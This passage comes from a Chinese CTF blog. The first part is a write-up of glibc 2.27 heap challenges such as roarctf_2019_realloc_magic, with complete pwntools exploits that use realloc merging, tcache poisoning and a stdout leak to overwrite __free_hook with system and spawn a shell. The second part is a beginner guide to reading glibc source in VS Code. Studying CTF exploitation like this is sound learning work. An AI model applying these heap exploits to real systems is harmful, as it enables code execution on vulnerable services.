<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add_r(<span class="number">0x100</span>,<span class="string">&#x27;aaaaaaaaa&#x27;</span>)<span class="comment">#这是大堆块	</span></span><br><span class="line">add_r(<span class="number">0x40</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#执行完这行代码，上面的这个大堆块就变成了0x50的可用堆块和0xc0的free状态堆块</span></span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#不过在这步的时候0x50这个堆块也被释放了</span></span><br><span class="line">add_r(<span class="number">0x20</span>,<span class="string">&#x27;prevent chunk&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>接着我们要先控制ptr_r的值为0x50堆块的那个地址，所以我们先将其申请回来，然后我们再申请0x100这个大堆块，这样realloc函数就会向下合并(向高地址合并)。</p>
<p><img src="/../img/2706180-20220826113121671-909787527.png"><br><img src="/../img/2706180-20220826113129858-1012521380.png"></p>
<p>因为合并后可以写入0x100的数据，因此我们就可以直接控制堆块的fd指针，将其改为stdout结构体地址。</p>
<p>这步的exp为：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add_r(<span class="number">0x40</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x100</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0xc1</span>)+<span class="string">b&#x27;\x60\xc7&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>然后剩下的部分就是常规操作的tcache dup+tcache poisoning了。<strong>要注意的是需要穿插realloc(ptr_r,-1)来控制ptr_r为空，再进行realloc时才是malloc函数。否则无法正常完成tcache poisoning。</strong></p>
<p>剩下这部分exp为：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add_m(<span class="number">0xb0</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add_r(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x30</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x30</span>,p64(sys_addr))</span><br><span class="line">add_c(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>最后放一下完整的exp<br><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p,e,libc=load(&#x27;a&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_m</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Data: &#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_c</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Data: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_r</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Data: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">Which</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Which: &#x27;</span>, <span class="built_in">str</span>(Which))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add_r(<span class="number">0x100</span>,<span class="string">&#x27;aaaaaaaaa&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x40</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x20</span>,<span class="string">&#x27;prevent chunk&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x40</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0x100</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0xc1</span>)+<span class="string">b&#x27;\x60\xc7&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,0xDD0,0xDD7,0xdde,0xde5)</span></span><br><span class="line">    add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add_m(<span class="number">0xb0</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">    add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x30</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">    add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x30</span>,p64(sys_addr))</span><br><span class="line">    add_c(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    delete(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="comment">#pwn()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27177</span>)</span><br><span class="line">        <span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220826111557058-2083144726.png"></p>
<h2 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a>roarctf_2019_realloc_magic</h2><h3 id="保护策略：-3"><a href="#保护策略：-3" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/2706180-20220826111633948-308368104.png"></p>
<p>这道题和上面那道题基本上一模一样，思路啥的也都一样。具体就不再放调试的图片了。具体的过程写到exp的注释里了。</p>
<p>一句话总结这题和上面那道题就是利用realloc向下合并的漏洞在tcachebin中踩出unsorted bin的fd指针。</p>
<h3 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP:"></a>EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#e=ELF(&#x27;./a&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/hacker/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size?\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content?\n&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#先申请一个大堆块A</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#然后realloc申请size为0的堆块，置空其指针</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#申请一个用来防止合并的小堆块</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#realloc申请size为0的堆块，置空其指针</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#因为刚才申请size为0的堆块的时候，这个堆块A被释放了，现在再申请回来</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;s&#x27;</span>)<span class="comment">#此时堆块A变成了使用状态的堆块B+空闲状态的堆块C 堆块B为0x70 堆块C为0x80</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#置空指针</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;uuuu&#x27;</span>)<span class="comment">#将堆块C申请出来</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete()</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#上面释放了堆块C七次，加上这一次，堆块C成功进入了unsorted bin中</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#将堆块B申请回来</span></span><br><span class="line">    add(<span class="number">0x100</span>,p64(<span class="number">0x0</span>)*<span class="number">15</span>+p64(<span class="number">0x81</span>)+<span class="string">b&#x27;\x60\x87&#x27;</span>)<span class="comment">#利用realloc函数，向下合并空闲堆块，至此堆块A回来了，我们向堆块A写入数据就可以编辑原本堆块C的fd指针，从而将其改写为stdout结构体地址</span></span><br><span class="line">    <span class="comment">#上面步骤最核心的地方是这个0x81，本来这个位置的堆块C的实际大小为0x91，但如果我们不修改它，之后的tcache dup+tcache poisoning是没法进行的，必须要破坏它的size，才能保证下面步骤的正确进行。</span></span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,0xba2,0xbae,0xA76)</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#将stdout结构体申请了出来</span></span><br><span class="line">    leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line"></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">666</span>))<span class="comment">#清空ptr指针，因为此时的ptr指针就是stdout结构体地址，如果对这个地址进行释放的话，程序会崩溃，因此我们需要用唯一的机会将其置零</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#接下来就是重复上面的步骤 tcache dup+tcache poisoning 往free_hook中写入system地址</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete()</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x90</span>,p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x91</span>)+p64(free_hook-<span class="number">8</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sys_addr))</span><br><span class="line">    delete()</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="comment">#pwn()</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25279</span>)</span><br><span class="line">        <span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">        pwn()    </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220826111647020-1771891318.png"></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>io leak</tag>
      </tags>
  </entry>
  <entry>
    <title>glibc中的源码该怎么读</title>
    <url>/posts/aec37d93.html</url>
    <content><![CDATA[<p>在PWN的学习过程中，阅读glibc的源代码是一项必备的技能。一方面而言有些问题需要深入到源码中寻找答案，另一方面阅读源码来探究glibc中函数的实现是再合适不过的方法(有很多师傅做了优秀的总结，可不论怎么阅读他人的总结还是不如自己去实际的探究一下)，最后一方面，在不断探究和学习源码的过程中其实也在不断的进步并打下基础，如此看来阅读glibc中的源码百利而无一害。但我对于第一次尝试阅读源码的印象颇深，无从下手，不知所措。于是乎我写下了这篇文章，来向当初和我一样入门的师傅们提供一些经验和建议。</p>
<span id="more"></span>

<p><strong>由于本人水平有限，提供的思路和建议未必是最好的，但应该是当下在我的认知中对我而言是最合适的了。如果有错误或更方便的做法，师傅们也可以提出来。</strong></p>
<h2 id="1、准备环境-amp-工具-amp-源码"><a href="#1、准备环境-amp-工具-amp-源码" class="headerlink" title="1、准备环境&amp;工具&amp;源码"></a>1、准备环境&amp;工具&amp;源码</h2><p>我们需要先把环境和工具准备好，这个其实很好搞。</p>
<p>我们需要去搞一下gdb源码调试的这个功能，尤其是在初学的时候，源码基本每行都看不懂(至少当时我是这样hhh)，那就必须要配合着gdb动态调试看源码了，这样我们可以去看一些变量的值，以及程序的走向又或者函数的调用关系等等。对于最初的萌新来说，这样就舒服很多了。</p>
<p>如何搭建gdb源码调试的环境可以看我的这篇文章  <a href="https://www.cnblogs.com/ZIKH26/articles/16150232.html">here</a></p>
<p>其次就是工具，工具的话建议选择vscode，这个具体咋搞就百度吧。</p>
<p>最后源码在这里下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://launchpad.net/ubuntu/+source/glibc/</span><br></pre></td></tr></table></figure>

<p>里面有很多个版本的glibc，如果没有特殊需要的话最好下载2.23-0ubuntu3这个版本。</p>
<p>最后打开vscode，将刚才下载的glibc的文件打开(说实话正常的话下面两张图片没必要放，因为现在在我看来这些步骤应该是理所当然，但我初学的时候其实连这个都不知道，也算是给曾经的自己看一下吧)</p>
<img src="https://s2.loli.net/2022/08/13/95XpLcSAPbKHMWI.png" alt="image-20220812222510249" style="zoom:50%;" />

<p>glibc中的文件有很多，选择我们需要分析的那个函数所在的文件夹即可。比如我要分析fopen函数，那就打开这个libio这个文件(想知道函数在哪个文件夹的话，百度一下即可)</p>
<p><img src="https://s2.loli.net/2022/08/13/ObFPWU6IGCpvHun.png" alt="image-20220812222621903"></p>
<h2 id="2、vscode的一些快捷键"><a href="#2、vscode的一些快捷键" class="headerlink" title="2、vscode的一些快捷键"></a>2、vscode的一些快捷键</h2><p>要说分析源码，不得不提的就是一些快捷键。使用快捷键和不使用快捷键的效率简直天差地别。</p>
<p>假设我现在在分析代码的1352行，这里出现了_IO_default_xsputn函数，如果我们要查看该函数定义的地方的话，ctrl+左键点击该函数，即可跳转到定义的地方。(如下图)</p>
<p><img src="https://s2.loli.net/2022/08/13/cELKu7FjeRkxwvC.png" alt="image-20220812223435147"></p>
<p>下图是我们已经跳转到函数定义的地方了，但是有一个很难受的事情就是，如果我们想回去刚才的代码继续分析还要手动再找回去么？ 我们可以使用快捷键Alt加&lt;-键(这个&lt;-键就是键盘里那个上下左右键的左)返回到刚刚的代码，同理Alt加-&gt;键可以再回到函数定义的地方。</p>
<img src="https://s2.loli.net/2022/08/13/CRyAYrdj6JwGsQp.png" alt="image-20220812223643803" style="zoom:50%;" />



<p>ctrl+f是在当前文件搜索指定的内容</p>
<p>ctrl+z就是撤回刚刚的一步操作</p>
<h2 id="3、宏-amp-如何溯源解决问题"><a href="#3、宏-amp-如何溯源解决问题" class="headerlink" title="3、宏&amp;如何溯源解决问题"></a>3、宏&amp;如何溯源解决问题</h2><p>在glibc源码分析中，宏定义十分常见(如果不知道什么是宏可以百度一下)</p>
<p>有可能你眼前这个陌生的东西就是个宏。(初学的时候，我看源码一脸懵，心想咋这么多东西我都没见过，我学的假的c语言么？)</p>
<p>以下面432这行代码为例：</p>
<p>发现上来就是一个_IO_size_t干懵萌新，因为之前没见过啊。</p>
<p><img src="https://s2.loli.net/2022/08/13/jeMiwLNGrAVnbHT.png" alt="image-20220812224439901"></p>
<p>我们ctrl+左键溯源一下这个_IO_size_t(如下图)，发现是个宏定义，不过size_t还是没见过呀，那就继续溯源</p>
<p><img src="https://s2.loli.net/2022/08/13/AC95BZto1L7rNge.png" alt="image-20220812224614100"></p>
<p>发现最终是typedef给unsigned __int64新定义了一个名字叫做size_t（不清楚typedef的请自行百度）</p>
<p><img src="https://s2.loli.net/2022/08/13/D1iZ68ECtof495l.png" alt="image-20220812224707086"></p>
<p>这下子unsigned int64我们认识了，这不就是无符号整形变量么，ok问题解决，最初的那行代码其实就是unsigned int64 count 定义了count这个变量，仅此而已。</p>
<p>下面放一个我初学时的问题，下面这个结构体Elf32_Sym为什么是16字节？(我在这里并不是想表达这个结构体是多大，<strong>我是想强调我们在面对不会的问题的时候，解决的思路应该如何</strong>)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word   st_name;      <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr   st_value;     <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word   st_size;      <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_info;      <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_other;     <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section    st_shndx;     <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>

<p>这似乎是在定义变量？ 可是没听过Elf32_Word是个变量类型啊。</p>
<p>鼠标右键一下（我当时用的是VisualStudio ，发现是有个转到定义的，就说明这个Elf32_Word也是个被定义的东西</p>
<img src="https://s2.loli.net/2022/08/13/TXZfAaqK5Cg3D2l.png" alt="image-20220301130300184" style="zoom:33%;" />

<p>到定义那里看一下发现了typedef这个东西和uint32_t，奈何c的基础不牢，google一下。</p>
<p><img src="https://s2.loli.net/2022/08/13/QmLDs2RXeESOtof.png" alt="image-20220301130416557"></p>
<p>发现了这个东西其实就是类似于提供了一个自定义类型的功能，举个例子，typedef unsigned int ai;</p>
<p>那么此时的ai就相当于unsigned int这个东西了，因此比如我们想定义一个unsigned int类型的变量b，就可以写成这样了，ai b;此时的效果是和unsigned int b;效果是一样的</p>
<p>那么这个uint32_t又是什么呢？继续google。</p>
<p>发现了这个uint32_t的这个_t的意思是这些数据类型（指的是uint32_t,而并非Elf32_Word）是通过typedef来定义的，而不是新的数据类型。也就是说，他们其实是我们已知的类型的别名。</p>
<p>然后下面这些就是这些数据类型被定义的地方</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">ifndef</span> __int8_t_defined  </span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __int8_t_defined  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">signed</span> <span class="type">char</span> <span class="type">int8_t</span>;</span><br><span class="line"><span class="keyword">typedef</span>	<span class="type">short</span> <span class="type">int</span> <span class="type">int16_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> <span class="type">int32_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> __WORDSIZE == 64  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">int</span> <span class="type">int64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span>  </span></span><br><span class="line">__extension__</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="type">int64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> <span class="type">uint8_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> <span class="type">uint16_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">ifndef</span> __uint32_t_defined  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">uint32_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __uint32_t_defined  </span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> __WORDSIZE == 64  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> <span class="type">uint64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span>  </span></span><br><span class="line">__extension__</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="type">uint64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br></pre></td></tr></table></figure>

<p>如此再回到这行代码  Elf32_Word	st_name，其实它就等同于unsigned int st_name，此时应该就能够看懂了。</p>
<p>最后回到最开始的那个问题，为什么这个结构是16字节？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word   st_name;      <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr   st_value;     <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word   st_size;      <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_info;      <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_other;     <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section    st_shndx;     <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>

